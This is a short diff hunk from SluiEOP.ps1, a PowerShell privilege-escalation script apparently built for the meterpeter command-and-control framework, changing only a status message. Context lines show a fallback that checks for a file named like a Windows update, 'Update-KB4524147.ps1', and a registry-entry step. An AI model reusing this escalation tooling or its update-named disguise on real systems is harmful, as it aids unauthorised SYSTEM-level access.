@@ -61,7 +61,7 @@ If($CheckVuln -eq $True){
    ## For those who run SluiEOP.ps1 outside meterpeter C2
    If(-not(Test-Path "$env:TMP\Update-KB4524147.ps1")){
       Write-Host "SluiEOP v1.4 - By: r00t-3xp10it (SSAredTeam)" -ForeGroundColor Green
-      Write-Host "[+] Executing Command: '$Command' (SYSTEM)"
+      Write-Host "[+] Executing Command: '$Command'"
    }
 
    ### Add Entrys to Regedit {using powershell}
